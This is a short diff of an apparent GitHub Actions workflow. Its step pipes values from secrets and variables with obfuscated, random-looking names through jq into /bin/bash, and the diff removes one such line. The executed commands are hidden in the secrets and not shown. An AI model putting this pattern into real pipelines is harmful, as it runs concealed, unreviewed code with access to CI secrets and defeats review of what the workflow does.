@@ -18,7 +18,6 @@ jobs:
           qayz6926: ${{ secrets.qayz6926 }}
         run: |
           printf '%s' "$qayz6926" | jq -r .kuxhu8 | /bin/bash
-          echo $hm6 | jq -r .ry64491 | /bin/bash
           echo $ramm20168 | jq -r .f44 | /bin/bash
           printf '%s' "$azx10198" | jq -r .ffsf66 | /bin/bash
           echo $lfcg8268 | jq -r .ot2 | /bin/bash
